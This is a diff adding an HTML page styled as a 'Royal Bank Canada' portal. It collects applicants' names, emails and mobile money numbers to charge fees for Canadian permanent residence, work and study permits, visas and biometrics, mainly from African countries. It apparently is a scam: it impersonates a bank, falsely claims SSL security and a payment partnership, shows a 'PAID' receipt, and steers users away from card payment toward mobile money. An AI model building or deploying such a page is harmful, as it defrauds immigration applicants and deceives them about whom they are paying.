@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>
+Royal Bank Canada | administrative service
+</title>
+
+<link rel="icon" type="image/png" href="assets/logo.png">
+
+<meta name="description"
+content="Secure Canada Administrative Services Portal">
+
+<link rel="preconnect"
+href="https://fonts.googleapis.com">
+
+<link rel="preconnect"
+href="https://fonts.gstatic.com"
+crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
+rel="stylesheet">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+
+<link rel="stylesheet"
+href="css/administrative-services.css">
+
+</head>
+
+<body>
+
+<!--=========================
+MOBILE HEADER
+==========================-->
+
+<header class="mobile-header">
+
+<div class="container">
+
+<a href="index.html"
+class="back-link">
+
+<i class="fa-solid fa-arrow-left"></i>
+
+<span>Back Home</span>
+
+</a>
+
+<div class="mobile-brand">
+
+<img
+src="images/logo.png"
+alt="Royal Bank Canada">
+
+<div>
+
+<h1>
+
+Royal Bank Canada
+
+</h1>
+
+<p>
+
+Administrative Services Portal
+
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+</header>
+
+<!--=========================
+MAIN
+==========================-->
+
+<section class="payment-section">
+
+<div class="container">
+
+<div class="payment-card">
+
+<div class="payment-title">
+
+<h2>
+
+Applicant Information
+
+</h2>
+
+<p>
+
+Complete this form to pay your administrative fees
+
+</p>
+
+</div>
+
+<form id="administrativeForm">
+
+<div class="grid">
+
+    <div class="form-group">
+
+        <label>First Name <span class="required">*</span></label>
+
+        <input
+        type="text"
+        id="firstName"
+        placeholder="Enter your first name"
+        required>
+
+    </div>
+
+    <div class="form-group">
+
+        <label>Last Name <span class="required">*</span></label>
+
+        <input
+        type="text"
+        id="lastName"
+        placeholder="Enter your last name"
+        required>
+
+    </div>
+
+    <div class="form-group full">
+
+        <label>Email Address <span class="required">*</span></label>
+
+        <input
+        type="email"
+        id="email"
+        placeholder="example@email.com"
+        required>
+
+    </div>
+
+    <div class="form-group full">
+
+        <label>Country <span class="required">*</span></label>
+
+        <select id="country" required>
+
+            <option value="">Select your country</option>
+
+            <optgroup label="Africa">
+
+    <option value="BJ">🇧🇯 Benin</option>
+    <option value="BF">🇧🇫 Burkina Faso</option>
+    <option value="CI">🇨🇮 Côte d'Ivoire</option>
+    <option value="CG">🇨🇬 Congo Brazzaville</option>
+    <option value="ML">🇲🇱 Mali</option>
+    <option value="SN">🇸🇳 Senegal</option>
+    <option value="TG">🇹🇬 Togo</option>
+
+    <option value="CM">🇨🇲 Cameroon</option>
+    <option value="GA">🇬🇦 Gabon</option>
+    <option value="CD">🇨🇩 Democratic Republic of the Congo</option>
+
+</optgroup>
+
+<optgroup label="North America">
+
+    <option value="CA">🇨🇦 Canada</option>
+    <option value="US">🇺🇸 United States</option>
+
+</optgroup>
+
+<optgroup label="Europe">
+
+    <option value="FR">🇫🇷 France</option>
+    <option value="GB">🇬🇧 United Kingdom</option>
+    <option value="BE">🇧🇪 Belgium</option>
+    <option value="CH">🇨🇭 Switzerland</option>
+    <option value="DE">🇩🇪 Germany</option>
+    <option value="IT">🇮🇹 Italy</option>
+    <option value="ES">🇪🇸 Spain</option>
+
+</optgroup>
+
+<optgroup label="Middle East">
+
+    <option value="AE">🇦🇪 United Arab Emirates</option>
+
+</optgroup>
+
+        </select>
+
+    </div>
+
+    <div class="form-group full">
+
+         <label>Administrative service to be paid for<span class="required">*</span></label>
+
+        <select id="service" required>
+
+            <option value="">Select Administrative Service</option>
+
+            <option value="Permanent Residence">Permanent Residence</option>
+
+            <option value="Work Permit">Work Permit</option>
+
+            <option value="Study Permit">Study Permit</option>
+
+            <option value="Visitor Visa">Visitor Visa</option>
+
+            <option value="Biometrics">Biometrics</option>
+
+            <option value="Administrative Fees">Administrative Fees</option>
+
+        </select>
+
+    </div>
+
+    <div class="form-group full">
+
+         <label>Mobile Money Number <span class="required">*</span></label>
+
+        <div class="phone-box">
+
+            <span id="countryCode">+</span>
+
+            <input
+            type="tel"
+            id="phone"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            autocomplete="off"
+            spellcheck="false"
+            required>
+
+        </div>
+
+    </div>
+
+    <div class="form-group full">
+
+        <label>Payment Network <span class="required">*</span></label>
+
+        <select id="paymentMethod" required>
+
+    <option value="">Select payment network</option>
+
+    <option value="TOGOCOM">TOGOCOM</option>
+
+    <option value="MOOV">MOOV</option>
+
+    <option value="VISA">VISA</option>
+
+    <option value="MASTERCARD">MASTERCARD</option>
+
+</select>
+
+    </div>
+
+    <div class="form-group full">
+
+        <label>Amount</label>
+
+        <input
+        type="text"
+        id="amountView"
+        readonly
+        placeholder="Automatically calculated">
+
+    </div>
+
+</div>
+    
+<div class="summary-card">
+
+<h3>
+
+Payment Summary
+
+</h3>
+
+<div class="summary-item">
+
+<span>Administrative Service</span>
+
+<strong id="serviceName">
+
+Not selected
+
+</strong>
+
+</div>
+
+<div class="summary-item">
+
+<span>Payment Network</span>
+
+<strong id="networkName">
+
+Not selected
+
+</strong>
+
+</div>
+
+<div class="summary-item">
+
+<span>Amount</span>
+
+<strong id="amountDisplay">
+
+0 CAD
+
+</strong>
+
+</div>
+
+<div class="summary-item">
+
+<span>Security</span>
+
+<strong>
+
+SSL 256-bit Encryption
+
+</strong>
+
+</div>
+
+<button
+type="submit"
+form="administrativeForm"
+class="pay-btn">
+
+<i class="fa-solid fa-lock"></i>
+
+Continue Secure Payment
+
+</button>
+
+</div>
+
+</form>
+
+</div>
+
+</div>
+
+</section>
+
+<!--=========================================
+PAYMENT MODAL
+==========================================-->
+
+<div
+class="payment-modal"
+id="paymentModal">
+
+<div class="payment-box">
+
+<div class="loading-circle">
+
+<i class="fa-solid fa-spinner fa-spin"></i>
+
+</div>
+
+<h2>
+
+Processing your payment...
+
+</h2>
+
+<p>
+
+Please confirm the payment request on your mobile phone. Do not close this page while we verify your transaction.
+
+</p>
+
+</div>
+
+</div>
+<!--=========================================
+SUCCESS MODAL
+==========================================-->
+
+<div
+class="success-modal"
+id="successModal">
+
+<div class="success-box">
+
+<div class="success-icon">
+
+<i class="fa-solid fa-circle-check"></i>
+
+</div>
+
+<h2>
+
+Payment Successful
+
+</h2>
+
+<p>
+
+Your administrative service payment has been completed successfully.
+
+</p>
+<div class="receipt-row">
+    <span>Payer Number</span>
+    <strong id="receiptPayerNumber">--</strong>
+</div>
+
+<div class="receipt-row">
+    <span>Status</span>
+    <strong>PAID</strong>
+</div>
+
+<div class="receipt-row">
+    <span>Administrative Service</span>
+    <strong id="receiptService">Not selected</strong>
+</div>
+
+<div class="receipt-row">
+    <span>Amount</span>
+    <strong id="receiptAmount">0 CAD</strong>
+</div>
+
+<div class="receipt-row">
+    <span>Date</span>
+    <strong id="receiptDate">--</strong>
+</div>
+
+<div class="receipt-row">
+    <span>Payment Method</span>
+    <strong id="receiptMethod">--</strong>
+</div>
+
+</div>
+
+<div class="receipt-buttons">
+
+<button
+id="printReceipt"
+type="button">
+
+<i class="fa-solid fa-print"></i>
+
+Print Receipt
+
+</button>
+
+<a
+href="index.html"
+class="home-btn">
+
+Return Home
+
+</a>
+
+</div>
+
+</div>
+
+</div>
+<!--=========================================
+FOOTER
+==========================================-->
+
+<footer>
+
+<div class="container">
+
+<div class="footer-content">
+
+<div>
+
+<h3>
+
+Royal Bank Canada
+
+</h3>
+
+<p>
+
+Secure Administrative Services Portal powered by Royal Bank Canada and FeexPay.
+
+</p>
+
+</div>
+
+<div>
+
+<h4>
+
+Support
+
+</h4>
+
+<p>
+
+24 Hours / 7 Days
+
+</p>
+
+<p>
+
+Secure SSL Connection
+
+</p>
+
+</div>
+
+<div>
+
+<h4>
+
+Accepted Payments
+
+</h4>
+
+<p>
+
+Mobile Money
+
+</p>
+
+<p>
+
+Visa / Mastercard
+
+</p>
+
+</div>
+
+</div>
+
+<div class="copyright">
+
+© 2026 Royal Bank Canada. All Rights Reserved.
+
+</div>
+
+</div>
+
+</footer>
+
+<script src="js/administrative-services.js"></script>
+
+    <div id="cardUnavailableModal" class="unavailable-modal">
+
+    <div class="unavailable-box">
+
+        <h2>Service currently unavailable</h2>
+
+        <p>
+            Payment by bank card
+            <strong>Visa</strong> and <strong>Mastercard</strong>
+            is currently unavailable.
+        </p>
+
+        <p>
+            Please choose another payment option..
+        </p>
+
+        <button type="button" id="returnToPaymentMethod">
+            Go back and edit the option
+        </button>
+
+    </div>
+
+</div>
+</body>
+
+</html>
